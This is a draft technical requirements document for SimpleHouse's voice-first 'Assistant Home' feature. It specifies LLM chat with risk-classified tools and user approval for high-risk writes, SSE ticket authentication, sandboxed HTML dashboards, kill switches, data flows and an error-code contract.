# Assistant Home & MCP-for-UI — Technical Requirements Document (TRD)

**Feature:** Voice-first AI Assistant Home surface with LLM-driven chat, tool-use, LLM-authored HTML dashboards, and eager-loaded reminder/suggestion cards
**Product:** SimpleHouse (iOS + Android React Native app, Cloudflare Workers backend)
**Document Type:** TRD
**Version:** v1.3
**Status:** DRAFT
**Created:** 2026-04-22
**Last Updated:** 2026-04-22
**Author:** a.tekhtelev@gmail.com

**Source Documents:**
- **Inspiration:** [MCP_UI_Architecture.md](MCP_UI_Architecture.md) — Step iOS POC we are adapting
- **Prior art (adopted):** [architecture-and-implementation-plan-v1.0.md](architecture-and-implementation-plan-v1.0.md) — 5-mode breakdown, risk-classified tools, ticket SSE, reuse map
- **Implementation Plan:** [MCP_UI_Implementation_Plan.md](MCP_UI_Implementation_Plan.md) (v1.3)

> **Terminology note.** "MCP" here is a branding alias inherited from Step. We do **not** implement Anthropic's Model Context Protocol. What we build is an LLM-driven chat + dashboard + proactive-card surface with a client-side function-calling registry. No `@modelcontextprotocol/sdk` dependency is added.

---

## §0.0 — Revision History (v1.2 → v1.3)

This pass resolves the remaining critical/high findings from the 3-reviewer audit cycle run against v1.2.

**Reverted from v1.2 (restored original TRD design):**
1. **Ticket TTL restored to 30 s.** ADR-3 / §8.4 had always specified 30 s; the Plan's v1.2 reduction to 10 s was inconsistent and is reverted. See §8.4 and §12.2 P3 note.
2. **HIGH_WRITE SSE parking restored to hold-open with 15-second keepalive comments.** TRD §6.2 lines 375–377 always described this; the Plan's v1.2 close-and-reconnect design is reverted. See §6.2 and the §12.2 P6 note.

**Fixes applied in v1.3:**
3. **Route prefix `/ai-chat/*` applied consistently.** Architecture diagram (§5.1), data-flow (§6.2 step 4), and auth matrix (§9) updated.
4. **Undo endpoint documented** in new §8.6 (was only implicitly referenced in LOW_WRITE `undo_token` events).
5. **Prewarm endpoint documented** in new §8.7 (was only mentioned in ADR-19).
6. **`ui_block` SSE event added** to §8.4 enumeration (§24 structured UI depends on this frame type).
7. **`send_contractor_message` tool removed** (contradicted §2 Non-Goal "No contractor-to-homeowner chat"). `list_contractor_messages` kept as READ-only. §23.13 count: 133 → **132**.
8. **Tool-count arithmetic corrected** in §5.2 ADR-16 (117 → 132) and §23.13.
9. **Source-document links corrected** — relative paths within `documents/Requirenments/AI Houskeeper /` (was broken `documents/features/` prefix).
10. **Open decisions D-10, D-11, D-13 resolved** with recommended defaults (see §16): 20-user internal allowlist × 1 week soak; card priority ordering = overdue > high-severity findings > housekeeper predictions > suggestions; empty-state copy = "Your home looks good 🏡 — want to plan your spring maintenance?"

---

## §0 — Summary

**One-paragraph goal.** Replace SimpleHouse's current static Home tab with an AI-driven **Assistant Home**: a voice-first surface that, on load, immediately renders actionable reminder/suggestion cards (overdue tasks, upcoming appointments, budget alerts, Housekeeper suggestions, report findings) — each tap-to-open or tap-to-resolve — and, on demand, lets the user converse with a multi-mode AI assistant that streams natural-language responses, renders sandboxed LLM-authored HTML dashboards, and executes typed tool calls covering **every action a user can perform manually** in the app. Mutating tools require user confirmation; read and low-risk tools execute automatically with undo.

**North-star principle (the main point).** *The AI must be able to do anything the user can do manually.* Every domain-write route that exists on the backend must have a matching tool in the registry, classified by risk. Every navigable screen must have a matching `navigate_*` tool. Gaps are tracked in Known Gaps and closed before rollout beyond internal allowlist.

**Ideal user flow.**
1. User opens the app → Home tab loads Assistant Home.
2. Within 1.5 s (warm cache) the user sees 2–5 actionable cards: the task that's overdue, the appointment tomorrow, the suggestion to winterize the tap, the insight about HVAC age.
3. User taps a card → navigates to the canonical detail screen (task, appointment, suggestion, report). Or taps Accept/Snooze/Dismiss to resolve inline without opening chat.
4. If the user wants anything else — "remind me to clean gutters monthly", "what did my inspection say about the roof?", "schedule a plumber", "log last week's HVAC invoice", "what's my total spend this quarter?" — they tap the voice button (or text pill), speak/type, and the AI streams back a response, deep-links them to the right screen, or proposes a mutation they approve with one tap.

**Primary users.** All authenticated SimpleHouse homeowners with at least one household.

**Deployment scope.** Backend + Frontend. Backend: Cloudflare Workers + Hono + D1. Frontend: Expo React Native app (iOS primary, Android smoke-only in v1.0).

**Priority.** P1. Strategic feature; measured rollout; not blocking revenue.

---

## §1 — Background & Motivation

1.1 **Current state (from three deep-research passes).**
- Backend SSE endpoint `backend/src/routes/ai.ts` `POST /ai/chat/stream` exists with Gemini `gemini-2.0-flash-exp` + 9 tools. **Orphaned:** auth is not attached, tools auto-execute without confirmation, `currentHousehold?.id` is always `undefined`, and the RN app calls the legacy non-streaming `/chat` endpoint instead.
- Legacy chat at `backend/src/routes/chat.ts` + `backend/src/services/chat-service.ts` is Gemini-only, report-scoped, non-streaming. The RN screen `src/screens/chat/ChatScreen.tsx` consumes it but is orphaned (no navigator registers it).
- **AI Housekeeper subsystem exists and is production:** `backend/src/routes/ai-housekeeper.ts`, `src/api/ai-housekeeper.ts`, `src/screens/ai/AIInsightsDashboardScreen.tsx`, `src/screens/settings/AIHousekeeperSettingsScreen.tsx`. Provides `getSuggestions`, `getPredictions`, `getSeasonalChecklist`, `getInsights`, `analyzeHousehold`. Triggered by cron `*/5 * * * *` in production. These are the cards we show on Assistant Home.
- Anthropic SDK installed (`@anthropic-ai/sdk ^0.32.1`) but only used for PDF extraction; `claude-provider.ts` does not expose streaming or tool use.
- `react-native-webview` is **not installed** — greenfield.
- **PDF citation system shipped Feb 2026:** `src/components/reports/PDFViewerModal.tsx` opens at a target page with `pdfCache`. We reuse this for `PdfCitationChip` in chat.
- **Known security gaps** (treated as must-fix in this TRD): unauthenticated stream endpoint, auto-executed destructive tools, in-memory rate limiter on multi-isolate hot path, token-prefix logs in auth middleware, missing household-membership check inside tool executor.

1.2 **Why now.**
- The current Home screen is a widget grid; retention data (per Product) shows low engagement with individual widgets. Homeowners want "what do I need to do today" answered in one surface.
- AI Housekeeper is already generating structured suggestions that have no prominent surface today; they only appear in a Settings sub-screen.
- Per-turn chat-only UI has high friction; hybrid card-first + conversational-on-demand reduces time-to-value from ≥2 taps to 0 taps.

1.3 **Why not just extend the existing `/ai/chat/stream`.**
- The endpoint is unauthenticated, auto-executes mutating tools, and has no household scoping. Building on it would bake these in. We fix them as prerequisite work in Phase 1.

---

## §2 — Non-Goals

Items **explicitly out of scope** for v1.0:

- **No Anthropic MCP protocol runtime** on device. No `@modelcontextprotocol/sdk`.
- **No on-device LLM.** All inference server-side.
- **No user-authored HTML.** HTML only from sanitized LLM output.
- **No contractor-to-homeowner chat** (separate Messages feature).
- **No voice output (TTS).** Voice input is in-scope (reuses `voiceRecordingService`).
- **No multi-user collaborative chat sessions.** One session = one `user × household`.
- **No replacement of settings, labor hub, reports, tasks.** The Assistant Home replaces only the Home tab's primary body; the other four tabs (Tasks, Contractors, Reports, Settings) are untouched.
- **No deletion of the existing widget grid.** Legacy widgets move to a "Customize Home" screen accessible from a small icon in the Assistant Home header; users who prefer the old view can switch (soft rollback).
- **No Gemini streaming on the new chat path.** v1.0 ships the new chat pipeline on Claude (`claude-sonnet-4-5-20250929`, already wired in `backend/src/ai/claude-provider.ts` for PDF extraction). Gemini remains wired for the legacy `/chat` endpoint, contractor search, and the existing `backend/src/services/ai/gemini-service.ts` tool-call experiment. The Haiku fast path and Opus dashboard tier documented in ADR-18 are Phase 8 work — v1.1 baseline is single-model Sonnet 4.5.
- **No dashboard mode in the MVP cut.** Dashboard HTML is Phase 6; the MVP (Phases 0–5) ships with chat + report_qa + task_assistant + onboarding + card surface.
- **No Android polish in v1.0.** iOS-first; Android must not crash.
- **No retroactive tool execution.** Denial is terminal.
- **No offline mode.** Chat and card refresh require connectivity. Cards have MMKV-cached fallback for last-seen data with "last updated at" label.
- **No dashboard edit mode.** LLM HTML is display-only with a narrow `data-action` bridge.

---

## §3 — Goals & Non-Functional Requirements

### 3.1 Functional goals

- **G-1** Assistant Home is the default Home tab. On mount it renders (a) a voice-primary/text-secondary input affordance, (b) a greeting row with context (time-of-day + first name), (c) skeleton cards that fill in progressively with real data.
- **G-2** Assistant Home eagerly fetches and displays, within 1.5 s of mount (cached) or within 3 s (cold), these card types:
  - **Priority** — overdue maintenance tasks + high-severity action items
  - **Housekeeper Suggestions** — top 3 unaccepted, unsnoozed suggestions from AI Housekeeper
  - **Upcoming** — next 3 appointments + next garbage collection
  - **Mini-Dashboard** (Phase 6) — LLM-authored HTML widget (budget-this-month, tasks-completed-this-quarter). Behind `ai_chat_html_enabled` flag.
  - **Insights** — one AI Housekeeper insight card if available
  - **Upload prompts** — zero-state invitations to add an inspection report or floor plan when the household has none. Tapping triggers the same `start_report_upload` / `start_floor_plan_upload` flow used from chat. Dismissing the card remembers the dismissal for 7 days via MMKV.
  - **Empty state** — when nothing urgent: a short reassurance message with optional nudge cards.
- **G-3** User can tap the voice button to speak → audio is uploaded to the existing `voiceRecordingService` endpoint → backend transcribes → transcription seeds a chat turn.
- **G-4** User can tap the text field (collapsed by default) to expand, type, and send a message.
- **G-5** Chat responses stream via SSE with typewriter, supporting 5 modes:
  - `chat` (general home Q&A; READ + LOW_WRITE tools allowed)
  - `report_qa` (requires `context.reportId`; READ-only; responses include PDF citation chips)
  - `dashboard` (READ-only; emits LLM-authored HTML at end of stream; Phase 6, flagged)
  - `onboarding` (guided household setup)
  - `task_assistant` (task CRUD-focused; HIGH_WRITE allowed with mandatory approval)
- **G-6** AI can emit navigation hints that deep-link the user into existing screens (report detail, PDF at page, task detail, contractor detail).
- **G-7** Every tool call is audited — `ai_tool_audit` row persists args (PII-redacted per tool allowlist), result hash, approval status, timestamps.
- **G-8** Sessions persist in D1 (30-day retention) and locally in MMKV (last 3). User can resume an old conversation.
- **G-9** Global kill switch in under 60 s via `CONFIG_KV.ai_chat_killswitch`. Per-mode kill (`ai_mode_{name}_enabled`) and per-tool kill (`ai_tool_{name}_enabled`).
- **G-10** Tap a Priority/Upcoming card to open its canonical detail screen. Tap "Snooze" / "Dismiss" / "Accept" on a Suggestion card to mutate via existing AI Housekeeper API without opening chat.
- **G-11** Pull-to-refresh on Assistant Home re-runs card aggregation; optionally triggers `aiHousekeeperApi.analyzeHousehold` if >24h since last analysis.
- **G-12** A small "Switch to widget Home" option in the header lets the user revert to the legacy widget grid (behind `allow_legacy_home` flag, defaulting to `true` in v1.0 as a safety net).

### 3.2 Non-functional goals

- **NF-1 Card latency.** p95 card first-paint (skeleton → data) < **300 ms** with MMKV cache; p95 cold < **1.2 s** (aggressive target — single aggregated endpoint + stale-while-revalidate + Cloudflare edge cache private-per-user).
- **NF-2 Stream latency.** First SSE chunk ≤ **800 ms** on Haiku fast path (cache hit), ≤ 1.5 s on Sonnet (cache hit), ≤ 2.5 s cold Sonnet. Tool-loop round-trip ≤ **4 s** (p95, cached).
- **NF-3 Availability.** Graceful degrade: if `/ai-chat/capabilities` returns `enabled:false`, Assistant Home shows cards only (no voice/text affordance) and a banner.
- **NF-4 Cost envelope.** Per-user 24h input-token budget (default 500k) and per-user-per-hour stream cap (default 20). Tunable via `CONFIG_KV`.
- **NF-5 Security.** LLM HTML sanitized server-side (DOMPurify) before emit. CSP `default-src 'none'; script-src 'nonce-<rnd>' 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; connect-src 'none';` injected server-side. WebView hardened (§5.3).
- **NF-6 Privacy.** Per-tool context allowlist in `backend/src/services/ai/context/context-builder.ts`. Home addresses, phone numbers, member emails never leave the Worker in an LLM context unless a specific tool explicitly needs them. Untrusted content (report OCR, user messages forwarded to the model) is wrapped in `<<UNTRUSTED_CONTENT>>…<<END>>` fences.
- **NF-7 Observability.** Every chat turn, tool call, confirmation, kill-switch hit, and card-fetch produces a structured log line with `sessionId`, `userId`, `householdId` (no PII).
- **NF-8 Testability.** Tool registry is unit-testable without the LLM. SSE integration-tested with `@cloudflare/vitest-pool-workers`. LLM output snapshot-testable against a fixture provider.
- **NF-9 Accessibility.** Voice button has `accessibilityLabel="Ask your home assistant"`, VoiceOver-reachable. Every LLM-authored HTML dashboard embeds a hidden `<table>` equivalent to any chart. Cards have semantic roles.
- **NF-10 Degraded mode.** If `CONFIG_KV` is unreachable, fail-closed: `enabled=false`. Cards still render from TanStack Query's stored cache with an "offline" banner.

---

## §4 — State Model, Invariants, Idempotency, Time Source

### 4.1 Core entities

```
AiChatSession { id (uuid), user_id, household_id, mode, title (nullable),
                created_at, updated_at, last_message_at, is_archived }

AiChatMessage { id (uuid), session_id, turn_id (uuid), role ('user'|'assistant'|'system'|'tool'),
                content_text, content_html (sanitized, nullable),
                citations_json (nullable),
                tool_call_id (nullable, fk → AiToolCall),
                created_at, metadata_json }

AiToolCall     { id, session_id, turn_id, message_id (set after persist),
                 tool_name, tool_version ('v1'), category ('read'|'low_write'|'high_write'|'navigation'),
                 args_json, status, result_json, error_code,
                 idempotency_key (unique, required for writes),
                 approved_by_user_at, executed_at, created_at }

AiToolPending  { id, session_id, tool_call_id, args_json, expires_at, created_at }  // HIGH_WRITE parking

AiToolAudit    { id, user_id, household_id, session_id, tool_name, category,
                 args_redacted_json, result_hash, status, created_at }

AiIdempotencyKey { key (pk), user_id, tool_name, result_json, expires_at, created_at }  // 24h TTL

AssistantHomeCardCache (KV or D1 materialized):  cached per (user_id, household_id)
  with TTL 5 min for suggestions, 60 s for overdue tasks, 60 s for upcoming appointments.
```

### 4.2 Tool call state machine

```
                              auto_executed
                                     ↑
pending_approval --approve--> approved --execute--> executed
       |                                              |
       +--deny--> denied                              +--error--> failed
       +--expire--> expired  (10 min TTL in aiToolPending)
```

- **READ** tools skip `pending_approval` → `auto_executed`.
- **LOW_WRITE** tools skip `pending_approval` → `auto_executed`, but emit an `undo_token` on the SSE stream; UI shows a 5-s snackbar with Undo. Undo calls a dedicated tool that reverses the mutation (only applicable for reversible writes).
- **HIGH_WRITE** always → `pending_approval`. No bypass.
- **NAVIGATION** emits `navigation_hint` (client-side-only) with no DB write.

### 4.3 Invariants

- **I-1** Every `AiChatMessage` with `role='assistant'` + `tool_call_id IS NOT NULL` references exactly one `AiToolCall` with the same `turn_id`.
- **I-2** A `high_write` tool call cannot transition to `executed` without `approved_by_user_at IS NOT NULL`. Enforced at Worker layer + D1 trigger.
- **I-3** `idempotency_key` is unique per `(user_id, tool_name)`. Duplicate POST with same key returns cached result without re-executing.
- **I-4** `household_id` on every `AiChatSession` corresponds to a membership in `household_members` at session-create. Re-verified per request.
- **I-5** `AiChatMessage.content_html` passed through DOMPurify server-side before persist + emit. No row contains raw `<script>` lacking the request nonce.
- **I-6** `AiChatSession.is_archived=true` is read-only; new messages rejected `AI_SESSION_ARCHIVED`.
- **I-7** At most one in-flight stream per `(user_id, household_id)`. Second attempt returns `AI_STREAM_ALREADY_ACTIVE`. Enforced via `ChatSessionDO`.
- **I-8** `householdId` is NEVER a tool argument. It is rebound server-side from the JWT + session. Runtime assertion in `ToolRegistry.execute` — any tool whose `parameters` schema includes `household_id` fails fast.
- **I-9** Per-mode tool allowlist is enforced in `ChatMode.allowedTools`; the LLM can only receive a tool definition if the active mode's allowlist includes it.
- **I-10** Assistant Home card data is a **read-only projection** of existing domain tables. No card-layer writes to domain state.

### 4.4 Idempotency

- Every write tool (LOW_WRITE or HIGH_WRITE) MUST carry an `idempotency_key` generated by the Worker at tool-emit time, threaded through the approval modal, and used unchanged at execution.
- Execution path first SELECTs `AiIdempotencyKey`; on hit, returns cached result.
- Keys expire 24 h after creation; cleaned by existing cron.

### 4.5 Time source

All `created_at`/`updated_at`/`last_message_at` values are written server-side via Drizzle `sql`(datetime('now'))`` defaults — project-wide convention (see `backend/src/db/schema.ts`). Client timestamps are never trusted for canonical state.

---

## §5 — Architecture Overview

### 5.1 Layered diagram

```
+---------------- React Native (Expo) ----------------+
| src/screens/home/AssistantHomeScreen.tsx   (REPLACES HomeScreen as Home tab body)
|   |-- components/home/AssistantGreetingRow.tsx
|   |-- components/home/VoiceTextInput.tsx              (voice-primary + collapsible text)
|   |-- components/home/CardDeck.tsx                    (skeleton → real cards)
|   |     |-- cards/PriorityCard.tsx                    (overdue tasks + action items)
|   |     |-- cards/SuggestionCard.tsx                  (AI Housekeeper suggestion)
|   |     |-- cards/UpcomingCard.tsx                    (appointments + garbage)
|   |     |-- cards/InsightCard.tsx                     (AI Housekeeper insight)
|   |     |-- cards/MiniDashboardCard.tsx               (LLM HTML; Phase 6)
|   |     |-- cards/EmptyStateCard.tsx
|   |-- components/home/SwitchToLegacyHomeMenu.tsx
|
| src/screens/chat/AssistantChatScreen.tsx              (expanded chat from input / "View all")
|   |-- components/chat/MessageList.tsx
|   |   |-- ChatMessageBubble.tsx
|   |       |-- TypewriterText.tsx
|   |       |-- DashboardWebView.tsx   (Phase 6)
|   |       |-- PdfCitationChip.tsx
|   |       |-- ToolApprovalCard.tsx
|   |-- components/chat/ChatInputBar.tsx
|   |-- components/chat/ModePicker.tsx
|
| src/features/assistant-home/useAssistantHomeCards.ts  (aggregator hook, TanStack Query)
| src/features/ai-chat/transport/sseClient.ts           (react-native-sse + ticket)
| src/features/ai-chat/transport/chatApi.ts             (ticket, stream, tool-result)
| src/features/ai-chat/modes/                           (ChatMode id + UI metadata)
| src/features/ai-chat/tools/clientToolHandlers.ts      (navigation_hint dispatcher)
| src/features/ai-chat/tools/toolApprovalPolicy.ts      (mirror of backend risk table)
| src/stores/chatStore.ts                               (zustand + immer + MMKV persist)
| src/lib/ai/navigationDispatcher.ts                    (screen allowlist + Zod per screen)
+-----------------------------------------------------+
                              |
                    HTTPS + SSE (?ticket=<30s token>)
                              v
+---------------- Cloudflare Worker (Hono) ----------------+
| routes/ai-chat.ts                                         |
|   POST /ai-chat/stream/ticket               (30s single-use ticket; 5/min/user)
|   GET  /ai-chat/stream?ticket=...           (SSE, ticket-auth; keepalive comments during HIGH_WRITE parking)
|   POST /ai-chat/tool-result                 (approval/denial callback; resolves on open SSE)
|   POST /ai-chat/tools/:toolCallId/undo      (LOW_WRITE undo)
|   POST /ai-chat/prewarm                     (prompt-cache warmup; 1/min/user)
|   GET  /ai-chat/capabilities                (feature flags + tools version)
|   GET  /households/:hid/ai-home/cards       (aggregated card payload for Assistant Home)
|
| services/ai/
|   modes/
|     ChatMode.ts, BaseChatMode.ts, ChatModeRegistry.ts
|     ChatMode.chat.ts
|     ChatMode.reportQa.ts
|     ChatMode.dashboard.ts                   (Phase 6; supportsHtmlOutput)
|     ChatMode.onboarding.ts
|     ChatMode.taskAssistant.ts
|   tools/
|     ToolDefinition.ts                       ({name, params, category, risk, requiresApproval})
|     ToolRegistry.ts                         (register/getForMode/execute; enforces allowlist)
|     risk.ts                                 (READ_ONLY | LOW_WRITE | HIGH_WRITE | NAVIGATION)
|     tasks.ts, reports.ts, household.ts, contractors.ts,
|     housekeeper.ts, navigation.ts, garbage.ts, budget.ts,
|     appointments.ts, home-features.ts, suggestions.ts
|   context/
|     DashboardContextProvider.ts
|     ReportContextProvider.ts
|     context-builder.ts                      (PII allowlist + untrusted-content fences)
|   dashboard-html/
|     templates.ts                            (CSP wrapper, nonce, bundled Chart.js)
|     sanitizer.ts                            (DOMPurify config)
|     chart.umd.min.js                        (string asset)
|   gemini-service.ts                         (per-call systemPrompt + tools)
|   claude-provider.ts                        (unchanged in v1.0; Phase 8 upgrade)
|
| services/ai-home/
|   home-cards-service.ts                     (aggregates overdue + suggestions + upcoming + insights)
|
| durable-objects/
|   ChatSessionDO                             (per user:household; single-in-flight; kill poll)
|   rate-limiter.ts                           (existing; extended with ai:* limits)
|
| middleware/
|   auth.ts                                   (existing; token-prefix log removed)
|   rate-limit.ts                             (wired to DO for chat endpoints)
|
| db/
|   schema-ai-chat.ts                         (aiChatSessions, aiChatMessages, aiToolCalls,
|                                              aiToolPending, aiToolAudit, aiIdempotencyKeys)
+-----------------------------------------------------+
                              |
                    Gemini (generativelanguage.googleapis.com)
                    D1 (chat tables + domain tables)
```

### 5.2 Key design choices (ADR-style)

| # | Decision | Chosen | Alternative | Why |
|---|---|---|---|---|
| ADR-1 | Primary provider v1.0 | **Claude with tiered model routing** — Haiku 4.5 (`claude-haiku-4-5-20251001`) for instant/simple turns + card summaries; Sonnet 4.6 (`claude-sonnet-4-6`) for default chat + tool use; Opus 4.7 (`claude-opus-4-7`) for Phase 7 dashboard HTML generation. Model auto-selected by the mode's `preferredTier`. | Gemini 2.0 Flash (already wired in `gemini-service.ts`) | Claude has best-in-class prompt caching (90% cost / 85% latency reduction), native parallel tool use, and superior tool-use reasoning. SDK `@anthropic-ai/sdk` is already installed. Gemini remains for the legacy `/chat` report-QA endpoint. |
| ADR-2 | SSE client | **react-native-sse** with ticket auth | fetch-based `ReadableStream` | RN EventSource doesn't set headers; ticket keeps JWT out of URLs while still being library-compatible. |
| ADR-3 | SSE auth | **30 s single-use ticket from `POST /ai-chat/stream/ticket`** | JWT in query | Keeps access token out of Cloudflare logs; 30 s TTL limits replay. |
| ADR-4 | Tool approval | **Confirmation modal for every HIGH_WRITE; auto-exec with Undo snackbar for LOW_WRITE; auto-exec for READ** | Always auto / always prompt | Balances UX friction with safety. Prompt-injection via report PDFs is a realized threat. |
| ADR-5 | HTML sanitization | **Server-side DOMPurify inside Worker before SSE emit** | Client-side sanitize | Worker is trust boundary. |
| ADR-6 | Chart.js delivery (Phase 6) | **Bundled as string asset in Worker response** | CDN from `cdn.jsdelivr.net` | Eliminates egress channel; strict CSP enforceable. |
| ADR-7 | Session state | **`ChatSessionDO` keyed by `user_id:household_id`** | Stateless resend | Tool-loop resume + kill-switch poll + concurrent-stream rejection require server state. |
| ADR-8 | Kill switch | **`CONFIG_KV.ai_chat_killswitch`; 10 s isolate cache; mid-stream poll between turns** | Secret redeploy / DO broadcast | <60 s global propagation; no redeploy; per-tool + per-mode granularity. |
| ADR-9 | Tool schema versioning | **`X-Tools-Version` header, v1 current, backend supports 2 versions** | URL versioning | Avoids URL churn; registry is a version→tools map. |
| ADR-10 | Context redaction | **Per-tool allowlist; central `buildContext({ tool, household })`** | Raw `SELECT *` | PII leaks are the default failure mode. |
| ADR-11 | Idempotency | **Worker-minted `idempotency_key` on every write; 24 h KV cache** | Best-effort dedup | LLM + network duplication is real. |
| ADR-12 | Assistant Home card source | **Dedicated `GET /households/:hid/ai-home/cards` that aggregates server-side** | Multiple parallel client fetches | Single request = single auth check + predictable cache control + LLM-free fast path. |
| ADR-13 | Legacy Home preservation | **"Switch to widget Home" option retained behind `allow_legacy_home` flag** | Delete legacy outright | Safety net during rollout; lets users revert without a new build. |
| ADR-14 | Mode UX | **Modes are UI metadata + tool allowlist only; user never picks a mode by name** | User-facing mode picker | The chat decides mode from context (report screen → report_qa; task context → task_assistant; default chat). ModePicker exists only as a debug affordance. |
| ADR-15 | Staging DO block mitigation | **Parallel preview Worker (`simple-house-api-dev-preview`)** until Cloudflare resolves the staging DO issue | Ship to prod directly | Risk-controlled testing; TestFlight can hit the preview Worker via dev-only config. |
| ADR-16 | Prompt caching strategy | **4 `cache_control` breakpoints** per request: (1) system prompt, (2) tool-definitions block, (3) household-static context (profile, spaces, home-features — changes rarely), (4) recent-history summary. Dynamic turn + fresh-read context comes AFTER all breakpoints. `ttl:'1h'` for breakpoint (1+2) (static across sessions); default 5 min for (3+4). Target cache hit rate ≥ 60 % after warm-up. | Single breakpoint / no caching | 90 % cost + 85 % latency reduction on cache hit. Static tool-definitions (132 tools × schema ≈ 9–17 k tokens) would otherwise re-ingest on every turn. |
| ADR-17 | Primary render path for AI-generated UI | **Structured UI JSON schema → native RN components** (A2UI-inspired; see §24). Each assistant turn may include a `ui` array of typed blocks (`text`, `card`, `card_group`, `chart_summary`, `list`, `action_prompt`, `citation`). Client maps to pre-built RN components. LLM-authored HTML+Chart.js kept for Phase 7 `dashboard` mode only. | LLM-authored HTML in WebView everywhere | Structured UI is (a) sandboxed by construction (no CSP/DOMPurify), (b) accessible by default (native VoiceOver), (c) ~3× faster to render (no WebView), (d) theme-consistent with the app, (e) smaller token footprint. Mirrors 2026 generative-UI trend (Google A2UI v0.9, Vercel `json-render`). |
| ADR-18 | Fast-path model routing | **Haiku 4.5 for card summaries, suggestion explanations, and "simple reply" detection (first turn under 200 input tokens)**. Route upgrades to Sonnet 4.6 when the turn touches tools. Opus 4.7 is reserved for Phase 7 dashboard HTML. Routing decision is made server-side per turn via `ChatMode.preferredTier` + heuristic classifier. | Single model for everything | Haiku TTFB < 500 ms on cached prompts — the difference between "magical" and "laggy" on Assistant Home's greeting/inline explanations. |
| ADR-19 | Speculative pre-warm | On `AppState → active` AND user opens Home tab, RN fires a single `POST /ai-chat/prewarm` (no-op body) that causes the Worker to pre-compute cache keys and warm the next-turn prompt slot. Response `{ warm: true, model: 'haiku-4-5' }`. If the user then sends a message within 5 min, cache hit is near-guaranteed. Cost is one zero-token request. | No pre-warm | Shaves ~300–500 ms off the first interaction after app open. |

### 5.3 WebView hardening (Phase 6)

`DashboardWebView` props:
- `originWhitelist={['about:blank']}`
- `source={{ html, baseUrl: undefined }}`
- `javaScriptEnabled={true}` (required for Chart.js)
- `allowFileAccess={false}`
- `allowUniversalAccessFromFileURLs={false}`
- `allowsBackForwardNavigationGestures={false}`
- `mixedContentMode='never'`
- `setSupportMultipleWindows={false}`
- `onShouldStartLoadWithRequest` returns `false` for any URL other than `about:blank`
- `injectedJavaScriptBeforeContentLoaded={<nothing that reads auth context>}`
- `onMessage` validates payload against a Zod action-allowlist
- Content contains server-injected CSP meta-tag + server-injected nonce; nonce is per-render.

---

## §6 — Data Flow

### 6.1 Assistant Home load (eager cards, no LLM in hot path)

```
1. User opens Home tab → AssistantHomeScreen mounts.
2. useAssistantHomeCards() reads MMKV cache for (userId, householdId) → renders skeletons + any stale data with "Updated N min ago".
3. TanStack Query fires GET /households/:hid/ai-home/cards (staleTime=60s, cacheTime=5m).
4. Worker: auth + household membership check.
5. Worker: HomeCardsService aggregates in parallel:
   - overdue_tasks: SELECT from maintenance_tasks + action_items (priority ordering)
   - suggestions: AiHousekeeperService.listSuggestions(householdId, limit=3, unread=true)
   - upcoming: AppointmentsService.listUpcoming(limit=3) + GarbageService.next(householdId)
   - insights: AiHousekeeperService.getLatestInsight(householdId)
   - budget_snapshot (Phase 6): BudgetService.monthTotalByCategory(householdId) — compact JSON
6. Response: { priority: [], suggestions: [], upcoming: [], insight: {}, budget?: {}, generated_at }
7. RN: hydrate cards; MMKV-cache response; mark "Updated just now".
```

No LLM call. No streaming. Classic REST. Kill switch advisory only (cards still render even if `ai_chat_killswitch.killed===true`).

### 6.2 Chat turn (user taps voice or text)

```
1. User taps voice → voiceRecordingService records → uploads → transcription returned.
   (Or types + taps Send.)
2. RN: chatStore.beginTurn({ mode, text, voice_transcript_id? }).
3. RN: POST /ai-chat/stream/ticket → { ticket: <uuid>, expires_at }
4. RN: react-native-sse connects to /ai-chat/stream?ticket=...&session_id=...
   Headers: X-Tools-Version: v1, X-Idempotency-Key: <uuid>
5. Worker: validates ticket (single-use, 30 s TTL, bound to user).
6. Worker: resolves ChatMode via ChatModeRegistry from session mode.
7. Worker: builds context via ChatMode's context provider (per-tool allowlist).
8. Worker: routes into ChatSessionDO (single-in-flight check; kill-switch poll).
9. DO: opens SSE response (Hono streamSSE).
10. DO: calls claudeChatService.streamChat with systemPrompt + allowedTools + history.
11. Chunks:
    text_delta          → {type:'text', content}
    function_call READ  → auto-execute → {type:'tool_result', ...}
    function_call LOW   → auto-execute → {type:'tool_result', undo_token}
    function_call HIGH  → persist AiToolPending → {type:'tool_call_pending', tool_call_id, args}
                         → stream pauses; keepalive comments every 15 s
    (user approves → POST /ai-chat/tool-result → DO resumes → execute → feed result → continue)
    navigation_hint    → {type:'navigation_hint', action, params}
    citation (report_qa)→ {type:'citation', reportId, page, quote}
12. On completion: {type:'done', structuredData: { htmlContent?, citations? }, usage}.
13. SSE closes. Client finalizes in chatStore, MMKV-persists, invalidates affected TanStack Query keys.
```

### 6.3 Session replay on reconnect

If SSE drops mid-turn, RN re-opens with the same `X-Idempotency-Key`. Worker checks idempotency table; if turn is `in_progress`, DO resumes from last persisted event; if `complete`, replays events from `aiChatMessages` + `aiToolCalls`.

---

## §7 — Error Contract

| Code | HTTP | Retriable | Cause | User behaviour |
|---|---|---|---|---|
| `AI_DISABLED` | 503 | No | Kill switch | Banner "AI temporarily disabled." Cards still show. |
| `AI_MODE_DISABLED` | 503 | No | Per-mode flag off | Show "This mode is unavailable." fallback to `chat`. |
| `AI_RATE_LIMITED` | 429 | Yes (Retry-After) | Stream cap | "Slow down a bit — try again in N seconds." |
| `AI_QUOTA_EXCEEDED` | 429 | Yes (next day) | 24 h budget | "You've used your AI quota for today." |
| `AI_HOUSEHOLD_FORBIDDEN` | 403 | No | No membership | Redirect to household picker. |
| `AI_SESSION_NOT_FOUND` | 404 | No | Session deleted | Start new session. |
| `AI_SESSION_ARCHIVED` | 409 | No | Archive writes | "This conversation is read-only." |
| `AI_STREAM_ALREADY_ACTIVE` | 409 | Yes (after cancel) | Second concurrent stream | "Finish or cancel the current response." |
| `AI_TICKET_EXPIRED` | 401 | Yes (re-mint) | 30 s TTL exceeded | Client auto-remints + reconnects. |
| `AI_TICKET_INVALID` | 401 | No | Bad or reused ticket | Re-auth. |
| `AI_TOOL_UNKNOWN` | 400 | No | Unregistered tool invoked | Inject error into transcript; retry once. |
| `AI_TOOL_NOT_ALLOWED_FOR_MODE` | 400 | No | Mode allowlist violation | Log + inject error; model asked for out-of-mode tool. |
| `AI_TOOL_HOUSEHOLD_ARG_REJECTED` | 400 | No | I-8 violation | Fail fast; should never occur in tested builds. |
| `AI_TOOL_DENIED` | 200 (SSE frame) | No | User denied | Stream resumes; model informed. |
| `AI_TOOL_EXEC_FAILED` | 200 (SSE frame) | Sometimes | Downstream error | Model chooses retry or apology. |
